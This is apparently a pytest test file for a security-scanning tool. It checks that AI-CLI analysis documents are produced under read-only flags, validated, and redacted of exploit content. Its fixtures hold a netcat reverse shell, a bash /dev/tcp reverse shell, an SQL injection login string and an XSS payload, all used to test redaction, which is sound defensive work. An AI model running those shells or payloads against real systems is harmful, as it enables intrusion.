"""M-V3 analysis lane, house edition: our own analysis prompts driven through
the house CLIs (claude / codex / agy) with the SAME verified read-only flag
contract as the house scan arms; the returned document attaches as an
artifact — never a finding, never coverage, never the gate. Dual-use jobs are
export-excluded and post-checked for exploit-shaped content. All fake-proc."""

import hashlib
import json
import pathlib
import subprocess

import pytest

from security_council import artifacts as art
from security_council.arms import artifact_runner as ar
from security_council.arms.artifact_runner import ArtifactRunnerArm
from security_council.arms.registry import build_analysis_arm
from security_council.orchestrator import run_scan
from tests.test_entitlements import _cfg
from tests.test_orchestrator import FakeArm, _finding as orch_finding

SCHEMA_PATH = ar.SCHEMA_PATH
SCHEMA_TEXT = SCHEMA_PATH.read_text()


# --------------------------------------------------------------------------- #
# artifact model + job table
# --------------------------------------------------------------------------- #


def test_make_artifact_dual_use_defaults_to_export_excluded():
    a = art.make_artifact(job=art.ANALYSIS_JOBS["writeup"], path="raw/claude-analysis_writeup/w.md",
                          producer="house:claude", family="claude", run_id="r1", created_at="t")
    assert a.dual_use is True and a.export_excluded is True and a.kind == "writeup"
    tm = art.make_artifact(job=art.ANALYSIS_JOBS["threat-model"], path="raw/x/tm.md",
                           producer="house:codex", family="codex", run_id="r1", created_at="t")
    assert tm.dual_use is False and tm.export_excluded is False


def test_artifact_path_must_be_under_raw():
    with pytest.raises(ValueError, match="under raw/"):
        art.make_artifact(job=art.ANALYSIS_JOBS["threat-model"], path="/etc/passwd",
                          producer="p", family="claude", run_id="r", created_at="t")


def test_export_eligible_holds_back_dual_use():
    rows = [
        art.make_artifact(job=art.ANALYSIS_JOBS["threat-model"], path="raw/a/tm.md",
                          producer="p", family="claude", run_id="r", created_at="t").to_dict(),
        art.make_artifact(job=art.ANALYSIS_JOBS["attack-path"], path="raw/a/ap.md",
                          producer="p", family="claude", run_id="r", created_at="t").to_dict(),
    ]
    assert [a["kind"] for a in art.export_eligible(rows)] == ["threat-model"]


def test_artifact_id_stable_and_prefixed():
    kw = dict(kind="threat-model", producer="p", path="raw/a/tm.md", run_id="r1")
    assert art.artifact_id(**kw) == art.artifact_id(**kw) and art.artifact_id(**kw).startswith("A")


def test_every_job_has_a_house_prompt_and_the_schema_knows_it():
    """No job may point at a vendor skill: every job is one of OUR prompt files,
    the shared preamble exists, and the document schema's `kind` enum is
    exactly the job table."""
    assert ar.PREAMBLE_PATH.is_file()
    for job in art.ANALYSIS_JOBS.values():
        p = ar.PROMPT_DIR / job.prompt
        assert p.is_file() and job.prompt.startswith("house-analysis-"), job.key
        assert "Do NOT write working exploit code" in ar.PREAMBLE_PATH.read_text()
        assert f'"{job.key}"' in p.read_text()          # the prompt names its own kind
    schema = json.loads(SCHEMA_TEXT)
    assert set(schema["properties"]["header"]["properties"]["kind"]["enum"]) == set(art.ANALYSIS_JOBS)
    assert schema["properties"]["schema_version"]["enum"] == [art.DOCUMENT_SCHEMA_VERSION]
    # R10 lesson: the prompt must not speak only Claude Code's tool dialect
    assert "read-only shell commands" in ar.PREAMBLE_PATH.read_text()


# --------------------------------------------------------------------------- #
# document envelope validation
# --------------------------------------------------------------------------- #


def _doc(kind="threat-model", body="## Overview\n\nFine.\n", completion="complete",
         inputs=("app/x.py",), title="Threat model", notes=""):
    return {"schema_version": art.DOCUMENT_SCHEMA_VERSION,
            "header": {"kind": kind, "title": title, "scope": "whole repo",
                       "inputs_read": list(inputs), "completion": completion, "notes": notes},
            "body_markdown": body}


def test_validate_document_accepts_a_good_one_and_names_each_problem():
    job = art.ANALYSIS_JOBS["threat-model"]
    assert art.validate_document(_doc(), job=job) == []
    assert art.validate_document("nope", job=job) == ["document is not a JSON object"]
    assert any("header.kind" in p for p in art.validate_document(_doc(kind="writeup"), job=job))
    assert any("body_markdown" in p for p in art.validate_document(_doc(body="  "), job=job))
    assert any("schema_version" in p for p in
               art.validate_document({**_doc(), "schema_version": "x"}, job=job))
    assert any("completion" in p for p in art.validate_document(_doc(completion="done"), job=job))
    # a model claiming to have read outside the repo is flagged, not indexed
    for bad in ("/etc/passwd", "../other/secret.py", "C:\\x\\y", "a/../../z"):
        probs = art.validate_document(_doc(inputs=(bad,)), job=job)
        assert any("non-repository paths" in p for p in probs), bad
    # declined may omit the body
    assert art.validate_document(_doc(completion="declined", body=""), job=job) == []


# --------------------------------------------------------------------------- #
# Blue-scope post-check (best-effort, documented)
# --------------------------------------------------------------------------- #

_EXPLOITY = ("## Path\n\nRun this:\n\n```bash\nnc -e /bin/sh 10.0.0.1 4444\n```\n\n"
             "Then log in with `' OR '1'='1` as the username.\n\nDefend by parameterizing.\n")


def test_redaction_dual_use_strips_shell_blocks_and_payload_lines():
    body, labels = art.redact_exploit_content(_EXPLOITY, dual_use=True)
    assert labels == ["shell-block", "sql-injection-payload"]
    assert "nc -e" not in body and "'1'='1" not in body
    assert body.count("[redacted by security-council") == 2
    assert "Defend by parameterizing." in body           # the defensive prose survives


def test_redaction_non_dual_use_keeps_shell_blocks_but_strips_payloads():
    # a hardening doc legitimately contains shell (chmod, apt); payload strings never
    body, labels = art.redact_exploit_content(_EXPLOITY, dual_use=False)
    assert labels == ["reverse-shell", "sql-injection-payload"]   # lines, not the block
    assert "```bash" in body and "nc -e" not in body and "'1'='1" not in body
    clean = "## Hardening\n\n```bash\nchmod 600 config.yaml\n```\n"
    assert art.redact_exploit_content(clean, dual_use=False) == (clean, [])


def test_redaction_catches_reverse_shells_and_tools_everywhere():
    body = "x\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\nuse msfvenom here\n<script>alert(1)</script>\n"
    out, labels = art.redact_exploit_content(body, dual_use=False)
    assert sorted(labels) == ["exploit-tooling", "reverse-shell", "xss-payload"]
    assert out.splitlines()[0] == "x"


# --------------------------------------------------------------------------- #
# runner: argv contract per family (fake subprocess, like test_llm_cli)
# --------------------------------------------------------------------------- #


class _FakeProc:
    def __init__(self, returncode, stdout, stderr=""):
        self.returncode, self.stdout, self.stderr = returncode, stdout, stderr


def _claude_stdout(doc, *, model="claude-fable-5", cost=0.42, subtype="success", is_error=False):
    return json.dumps({"result": json.dumps(doc), "modelUsage": {model: {"outputTokens": 50}},
                       "total_cost_usd": cost, "subtype": subtype, "is_error": is_error})


def _agy_stdout(doc, *, status="SUCCESS", model="gemini-3.1-pro"):
    return json.dumps({"status": status, "structured_output": doc, "usage": {"model": model}})


def _patch(monkeypatch, stdout, *, returncode=0, last_file_content=None, timeout=False):
    calls = []

    def fake_run(cmd, **kw):
        calls.append((cmd, kw))
        if timeout:
            raise subprocess.TimeoutExpired(cmd, 1)
        if last_file_content is not None and "-o" in cmd:
            out_path = pathlib.Path(cmd[cmd.index("-o") + 1])
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_text(last_file_content)
        return _FakeProc(returncode, stdout)
    monkeypatch.setattr(subprocess, "run", fake_run)
    monkeypatch.setattr(ar.shutil, "which", lambda name: f"/usr/bin/{name}")
    return calls


def test_claude_argv_contract_and_provenance(monkeypatch, tmp_path):
    calls = _patch(monkeypatch, _claude_stdout(_doc()))
    arm = ArtifactRunnerArm(job="threat-model", family="claude")
    assert arm.available()[0]
    res = arm.run(tmp_path, tmp_path / "out", run_id="r1", collected_at="2026-08-26T00:00:00Z")
    assert res.ok and res.findings == [] and len(res.artifacts) == 1, res.error
    cmd, kw = calls[0]
    prompt = arm.build_prompt()
    # EXACT house-scan contract (llm_cli._claude_cmd) + the budget fuse; read-only
    # is the FLAG layer: plan mode and a tool list with no Bash/Write/Edit at all
    assert cmd == ["claude", "-p", prompt, "--output-format", "json",
                   "--json-schema", SCHEMA_TEXT,
                   "--permission-mode", "plan", "--tools", "Read,Grep,Glob,LS",
                   "--strict-mcp-config", "--no-session-persistence",
                   "--max-budget-usd", "5"]
    assert kw["env"]["SECURITY_COUNCIL_NESTED"] == "1" and kw["env"]["LLM_COUNCIL_NESTED"] == "1"
    assert kw["cwd"] == str(tmp_path.resolve())
    assert ar.PREAMBLE_PATH.read_text() in prompt and "threat-model" in prompt
    a = res.artifacts[0]
    assert a["producer"] == "house:claude" and a["family"] == "claude"
    assert a["kind"] == "threat-model" and a["path"] == "raw/claude-analysis_threat-model/threat-model.md"
    assert a["model_id"] == "claude-fable-5" and a["model_attested"] is True
    assert a["cost_usd"] == 0.42 and a["completion"] == "complete" and a["redactions"] == 0
    assert a["prompt_sha256"] == hashlib.sha256(prompt.encode()).hexdigest()
    assert a["inputs_read"] == ["app/x.py"] and a["export_excluded"] is False
    assert a["entitlement"] is None and a["safeguard_posture"] == "default"
    raw = tmp_path / "out" / "raw" / "claude-analysis_threat-model"
    md = (raw / "threat-model.md").read_text()
    assert md.startswith("<!-- security-council analysis artifact — a DOCUMENT, not a finding")
    assert "producer=house:claude" in md and "## Overview" in md and "- `app/x.py`" in md
    assert json.loads((raw / "document.json").read_text())["header"]["kind"] == "threat-model"
    assert res.coverage["cost_usd"] == 0.42 and res.coverage["cost_stopped"] is False
    assert res.command[2] == "<prompt>"          # the manifest never carries the prompt text


def test_codex_argv_contract_prompt_on_stdin(monkeypatch, tmp_path):
    calls = _patch(monkeypatch, "{}", last_file_content=json.dumps(_doc(kind="hardening")))
    arm = ArtifactRunnerArm(job="hardening", family="codex")
    res = arm.run(tmp_path, tmp_path / "out", run_id="r1", collected_at="t")
    assert res.ok, res.error
    cmd, kw = calls[0]
    raw = tmp_path / "out" / "raw" / "codex-analysis_hardening"
    assert cmd == ["codex", "exec", "--ignore-user-config", "-s", "read-only",
                   "--skip-git-repo-check", "-C", str(tmp_path.resolve()),
                   "-c", "mcp_servers={}", "--output-schema", str(SCHEMA_PATH),
                   "--json", "-o", str(raw / "codex-last.txt"), "-"]
    assert kw["input"] == arm.build_prompt()            # prompt travels on stdin
    assert kw["env"]["SECURITY_COUNCIL_NESTED"] == "1"
    a = res.artifacts[0]
    assert a["producer"] == "house:codex" and a["family"] == "codex"
    # codex never reports its served model (HANDOFF §7.3): say so, don't guess
    assert a["model_attested"] is False and a["model_id"] == "codex-account-default"
    assert a["cost_usd"] is None and res.coverage["model_unattested"] is True


def test_agy_argv_contract(monkeypatch, tmp_path):
    calls = _patch(monkeypatch, _agy_stdout(_doc(kind="policy")))
    arm = ArtifactRunnerArm(job="policy", family="agy")
    res = arm.run(tmp_path, tmp_path / "out", run_id="r1", collected_at="t")
    assert res.ok, res.error
    cmd, kw = calls[0]
    assert cmd == ["agy", "-p", arm.build_prompt(), "--output-format", "json",
                   "--json-schema", str(SCHEMA_PATH), "--mode", "plan", "--sandbox",
                   "--print-timeout", "18m", "--add-dir", str(tmp_path.resolve())]
    a = res.artifacts[0]
    assert a["producer"] == "house:agy" and a["family"] == "google"
    assert a["model_id"] == "gemini-3.1-pro" and a["model_attested"] is True


def test_model_pin_is_passed_and_substitution_fails_loudly(monkeypatch, tmp_path):
    calls = _patch(monkeypatch, _claude_stdout(_doc(), model="claude-opus-4-8"))
    arm = ArtifactRunnerArm(job="threat-model", family="claude", model="claude-mythos-5")
    res = arm.run(tmp_path, tmp_path / "out", run_id="r", collected_at="t")
    cmd, _ = calls[0]
    assert cmd[cmd.index("--model") + 1] == "claude-mythos-5"
    assert not res.ok and "model_substituted" in res.error          # D8
    assert res.coverage["classifier_fallback"] is True and res.artifacts == []


def test_gated_tier_posture_is_stamped(monkeypatch, tmp_path):
    _patch(monkeypatch, _claude_stdout(_doc(kind="attack-path"), model="daybreak-blue-latest"))
    arm = ArtifactRunnerArm(job="attack-path", family="claude", model="daybreak-blue-latest")
    res = arm.run(tmp_path, tmp_path / "out", run_id="r", collected_at="t")
    a = res.artifacts[0]
    assert a["dual_use"] is True and a["export_excluded"] is True
    assert a["entitlement"] == "daybreak-blue" and a["safeguard_posture"] == "relaxed"


@pytest.mark.parametrize("stdout,why", [
    (_claude_stdout(_doc(kind="writeup")), "invalid analysis document"),      # wrong kind
    (_claude_stdout(_doc(completion="declined", body="", notes="no access")), "declined: no access"),
    (_claude_stdout(_doc(), subtype="error_max_budget_usd"), "cost_stopped"),
    (_claude_stdout(_doc(), is_error=True), "arm not ok"),
    (json.dumps({"result": "not our envelope", "is_error": False}), "no structured output"),
    ("", "arm not ok"),
])
def test_bad_outcomes_are_failed_arms_without_artifacts(monkeypatch, tmp_path, stdout, why):
    _patch(monkeypatch, stdout)
    arm = ArtifactRunnerArm(job="threat-model", family="claude")
    res = arm.run(tmp_path, tmp_path / "out", run_id="r", collected_at="t")
    assert not res.ok and why in res.error and res.artifacts == [] and res.findings == []
    assert (tmp_path / "out" / "raw" / "claude-analysis_threat-model" / "cli-output.txt").is_file()
    if why == "cost_stopped":
        assert res.coverage["cost_stopped"] is True


def test_agy_soft_deny_and_timeout_are_failures(monkeypatch, tmp_path):
    _patch(monkeypatch, _agy_stdout(_doc(kind="policy"), status="CANCELED"))
    res = ArtifactRunnerArm(job="policy", family="agy").run(tmp_path, tmp_path / "o", run_id="r",
                                                             collected_at="t")
    assert not res.ok and "CANCELED" in res.error
    _patch(monkeypatch, "", timeout=True)
    res = ArtifactRunnerArm(job="policy", family="claude", timeout=7).run(
        tmp_path, tmp_path / "o2", run_id="r", collected_at="t")
    assert not res.ok and "timed out after 7s" in res.error


def test_dual_use_document_is_redacted_and_raw_only(monkeypatch, tmp_path):
    _patch(monkeypatch, _claude_stdout(_doc(kind="writeup", body=_EXPLOITY)))
    arm = ArtifactRunnerArm(job="writeup", family="claude")
    res = arm.run(tmp_path, tmp_path / "out", run_id="r", collected_at="t")
    assert res.ok, res.error
    a = res.artifacts[0]
    assert a["dual_use"] and a["export_excluded"] and a["redactions"] == 2
    assert res.coverage["redactions"] == ["shell-block", "sql-injection-payload"]
    raw = tmp_path / "out" / "raw" / "claude-analysis_writeup"
    md = (raw / "writeup.md").read_text()
    stored = json.loads((raw / "document.json").read_text())["body_markdown"]
    for text in (md, stored):                      # nothing unredacted is kept on disk
        assert "nc -e" not in text and "'1'='1" not in text
        assert "[redacted by security-council" in text
    assert "**Dual-use document.**" in md and "2 redaction(s)" in md
    assert art.export_eligible(res.artifacts) == []


def test_needs_findings_jobs_get_the_digest_in_the_prompt(monkeypatch, tmp_path):
    _patch(monkeypatch, _claude_stdout(_doc(kind="writeup")))
    arm = ArtifactRunnerArm(job="writeup", family="claude")
    assert arm.needs_findings is True
    assert "None was supplied" in arm.build_prompt()
    arm.findings_context = [{"id": "F0123456789abcdef", "title": "SQLi", "severity": "high",
                             "cwe_family": "injection", "cwe": ["CWE-89"],
                             "locations": ["app/db.py:3-4"], "sources": ["semgrep"]}]
    p = arm.build_prompt()
    assert "## Findings digest from this run" in p and "F0123456789abcdef" in p
    res = arm.run(tmp_path, tmp_path / "out", run_id="r", collected_at="t")
    assert res.artifacts[0]["related_finding_ids"] == ["F0123456789abcdef"]
    assert ArtifactRunnerArm(job="threat-model").needs_findings is False


def test_available_names_the_cli_and_the_read_only_flag(monkeypatch):
    monkeypatch.setattr(ar.shutil, "which", lambda name: f"/usr/bin/{name}")
    ok, why = ArtifactRunnerArm(job="threat-model", family="claude").available()
    assert ok and "--permission-mode plan --tools Read,Grep,Glob,LS" in why and "--max-budget-usd 5" in why
    ok, why = ArtifactRunnerArm(job="threat-model", family="codex").available()
    assert ok and "-s read-only" in why and "no cost fuse" in why
    ok, why = ArtifactRunnerArm(job="threat-model", family="agy").available()
    assert ok and "--mode plan --sandbox" in why and "house-analysis-threat-model.md" in why
    monkeypatch.setattr(ar.shutil, "which", lambda name: None)
    ok, why = ArtifactRunnerArm(job="threat-model", family="codex").available()
    assert not ok and why == "codex not on PATH"


def test_registry_builds_the_requested_family():
    assert build_analysis_arm("threat-model").cli.name == "claude"           # default
    assert build_analysis_arm("threat-model", family="codex").name == "codex-analysis:threat-model"
    arm = build_analysis_arm("writeup", options={"cli": "agy", "max_cost_usd": 2, "model": "m"})
    assert arm.cli.name == "agy" and arm.max_budget_usd == 2 and arm.model == "m"
    with pytest.raises(ValueError, match="unknown analysis CLI"):
        ArtifactRunnerArm(job="threat-model", family="claude-security")
    with pytest.raises(ValueError, match="unknown analysis job"):
        build_analysis_arm("nope")


def test_house_scan_arm_argv_is_unchanged_by_the_shared_builders(monkeypatch, tmp_path):
    """The analysis lane borrows llm_cli's builders; the scan arm's own contract
    must be exactly what ran live in R10 (no budget flag, finding schema)."""
    from security_council.arms.llm_cli import LlmCliArm, _SCHEMA_PATH
    calls = _patch(monkeypatch, json.dumps({"result": "{}", "is_error": False}))
    LlmCliArm("claude").run(tmp_path, tmp_path / "out", run_id="r", collected_at="t")
    cmd, _ = calls[0]
    assert cmd[:2] == ["claude", "-p"] and cmd[3:7] == ["--output-format", "json",
                                                          "--json-schema", _SCHEMA_PATH.read_text()]
    assert cmd[7:] == ["--permission-mode", "plan", "--tools", "Read,Grep,Glob,LS",
                       "--strict-mcp-config", "--no-session-persistence"]


# --------------------------------------------------------------------------- #
# orchestrator integration: never a finding, never coverage, never the gate
# --------------------------------------------------------------------------- #


class FakeAnalysisArm:
    kind = "artifact"
    supports_diff = False

    def __init__(self, job, ok=True, family="claude", needs_findings=False):
        self.name = f"{family}-analysis:{job}"
        self.family = family
        self.model = None
        self.needs_findings = needs_findings
        self.findings_context = None
        self._job, self._ok = job, ok

    def available(self):
        return True, "fake"

    def run(self, target, out_dir, *, run_id, collected_at):
        from security_council.arms.base import ArmResult
        if not self._ok:
            return ArmResult(self.name, self.kind, self.family, False, 1, "boom", [])
        a = art.make_artifact(job=art.ANALYSIS_JOBS[self._job], path=f"raw/x/{self._job}.md",
                              producer=f"house:{self.family}", family=self.family,
                              run_id=run_id, created_at=collected_at)
        return ArmResult(self.name, self.kind, self.family, True, 0, "", [],
                         artifacts=[a.to_dict()])


def _scan_arm(rc="a"):
    return FakeArm("semgrep", "scanner", "semgrep",
                   [orch_finding(source_id="semgrep", kind="scanner", vendor="semgrep", rc=rc)])


def test_orchestrator_attaches_artifacts_not_findings(tmp_path):
    run = run_scan(tmp_path, [_scan_arm()], _cfg(), out_dir=tmp_path / "out",
                   analysis_arms=[FakeAnalysisArm("threat-model"), FakeAnalysisArm("attack-path")])
    arts = run.manifest["artifacts"]
    assert {a["kind"] for a in arts} == {"threat-model", "attack-path"}
    assert {a["producer"] for a in arts} == {"house:claude"}
    assert len(run.findings) == 1 and run.findings[0].taxonomy.cwe_family == "injection"
    md = (run.out_dir / "summary.md").read_text()
    assert "## Analysis artifacts" in md and "dual-use" in md and "house:claude" in md
    assert [a["kind"] for a in art.export_eligible(arts)] == ["threat-model"]


def test_findings_json_is_untouched_by_artifacts(tmp_path):
    """The 'not a finding' invariant: the system of record is byte-for-byte the
    same with and without the analysis lane."""
    base = run_scan(tmp_path, [_scan_arm("q")], _cfg(), out_dir=tmp_path / "a")
    with_art = run_scan(tmp_path, [_scan_arm("q")], _cfg(), out_dir=tmp_path / "b",
                        analysis_arms=[FakeAnalysisArm("writeup"), FakeAnalysisArm("hardening")])
    fa = json.loads((base.out_dir / "findings.json").read_text())
    fb = json.loads((with_art.out_dir / "findings.json").read_text())
    assert [f["id"] for f in fa] == [f["id"] for f in fb] and len(fb) == 1
    assert "writeup" not in (with_art.out_dir / "findings.json").read_text()
    assert "writeup" not in (with_art.out_dir / "merged.sarif").read_text()
    assert len(with_art.manifest["artifacts"]) == 2 and base.manifest["artifacts"] == []


def test_failed_analysis_is_informational_and_the_gate_is_unchanged(tmp_path):
    # gating run: exit 1 from the real finding, with or without the failed analysis
    base = run_scan(tmp_path, [_scan_arm("b")], _cfg(), out_dir=tmp_path / "a")
    run = run_scan(tmp_path, [_scan_arm("b")], _cfg(), out_dir=tmp_path / "b",
                   analysis_arms=[FakeAnalysisArm("threat-model", ok=False)])
    assert [d["kind"] for d in run.manifest["degradations"]].count("analysis_failed") == 1
    assert run.exit_code == base.exit_code == 1
    # clean run: a failed analysis must not degrade a clean tree to exit 3 either
    clean = FakeArm("semgrep", "scanner", "semgrep", [], coverage={"completion": "complete"})
    base = run_scan(tmp_path, [clean], _cfg(), out_dir=tmp_path / "c")
    run = run_scan(tmp_path, [clean], _cfg(), out_dir=tmp_path / "d",
                   analysis_arms=[FakeAnalysisArm("threat-model", ok=False)])
    assert run.exit_code == base.exit_code == 0
    assert any(d["kind"] == "analysis_failed" for d in run.manifest["degradations"])
    arm_row = next(a for a in run.manifest["arms"] if a["name"] == "claude-analysis:threat-model")
    assert arm_row["ok"] is False and arm_row["error"] == "boom"       # visible, not gating


def test_analysis_arm_not_a_coverage_source(tmp_path):
    run = run_scan(tmp_path, [_scan_arm("c")], _cfg(), out_dir=tmp_path / "out",
                   analysis_arms=[FakeAnalysisArm("threat-model")])
    assert "claude-analysis:threat-model" not in run.findings[0].corroboration.eligible_sources


def test_orchestrator_hands_the_findings_digest_to_needs_findings_arms(tmp_path):
    wu = FakeAnalysisArm("writeup", needs_findings=True)
    tm = FakeAnalysisArm("threat-model")
    run = run_scan(tmp_path, [_scan_arm("d")], _cfg(), out_dir=tmp_path / "out",
                   analysis_arms=[wu, tm])
    [row] = wu.findings_context
    assert row["id"] == run.findings[0].id and row["sources"] == ["semgrep"]
    assert row["locations"] == ["app/x.py:1-1"] and "snippet" not in row
    assert tm.findings_context is None


def test_findings_digest_dedupes_by_root_cause():
    a = orch_finding(source_id="semgrep", kind="scanner", vendor="semgrep", rc="same")
    b = orch_finding(source_id="claude", kind="agent_cli", vendor="claude", rc="same")
    c = orch_finding(source_id="semgrep", kind="scanner", vendor="semgrep", rc="other")
    rows = art.findings_digest([a, b, c])
    assert [r["id"] for r in rows] == [a.id, c.id]
    assert art.findings_digest([a, b, c], limit=1) == rows[:1]


# --------------------------------------------------------------------------- #
# CLI end to end: scan --analyze threat-model
# --------------------------------------------------------------------------- #


def test_cli_scan_analyze_end_to_end(monkeypatch, tmp_path, capsys):
    from security_council import cli
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "x.py").write_text("x = 1\n")
    monkeypatch.setattr(cli, "_build_arms", lambda names, config, diff=None: [_scan_arm("e")])
    calls = _patch(monkeypatch, _claude_stdout(_doc()))
    rc = cli.main(["scan", str(tmp_path), "--analyze", "threat-model", "--json",
                   "--out", str(tmp_path / "out")])
    out = capsys.readouterr().out
    rec = json.loads(out[out.index("{"):])
    assert rc == 1 and rec["exit_code"] == 1                 # gated by the finding, as without
    manifest = json.loads((pathlib.Path(rec["out_dir"]) / "manifest.json").read_text())
    [a] = manifest["artifacts"]
    assert a["kind"] == "threat-model" and a["producer"] == "house:claude"
    assert a["model_id"] == "claude-fable-5" and a["prompt_sha256"]
    assert (pathlib.Path(rec["out_dir"]) / a["path"]).is_file()
    assert calls[0][0][0] == "claude" and "--permission-mode" in calls[0][0]
    findings = json.loads((pathlib.Path(rec["out_dir"]) / "findings.json").read_text())
    assert len(findings) == 1
    assert "## Analysis artifacts" in (pathlib.Path(rec["out_dir"]) / "summary.md").read_text()
    row = next(r for r in manifest["arms"] if r["name"] == "claude-analysis:threat-model")
    assert row["ok"] is True and row["cost_usd"] == 0.42


def test_cli_analyze_with_picks_the_cli_and_rejects_unknown_jobs(monkeypatch, tmp_path, capsys):
    from security_council import cli
    monkeypatch.setattr(cli, "_build_arms", lambda names, config, diff=None: [_scan_arm("f")])
    calls = _patch(monkeypatch, "{}", last_file_content=json.dumps(_doc(kind="hardening")))
    cli.main(["scan", str(tmp_path), "--analyze", "hardening", "--analyze-with", "codex",
              "--json", "--out", str(tmp_path / "out")])
    assert calls[0][0][:2] == ["codex", "exec"]
    assert cli.main(["scan", str(tmp_path), "--analyze", "bogus"]) == cli.EXIT_USAGE
    assert "unknown analysis job" in capsys.readouterr().err
    with pytest.raises(SystemExit):
        cli.main(["scan", str(tmp_path), "--analyze", "policy", "--analyze-with", "claude-security"])


def test_summary_appendix_flags_partial_redacted_unattested():
    from security_council.export.markdown import _analysis_artifacts
    a = art.make_artifact(job=art.ANALYSIS_JOBS["writeup"], path="raw/x/w.md", producer="house:codex",
                          family="codex", run_id="r", created_at="t", completion="partial",
                          redactions=3, model_attested=False).to_dict()
    text = "\n".join(_analysis_artifacts({"artifacts": [a]}))
    assert "dual-use" in text and "partial" in text and "3 exploit-shaped span(s) redacted" in text
    assert "model not attested" in text and "house:codex" in text
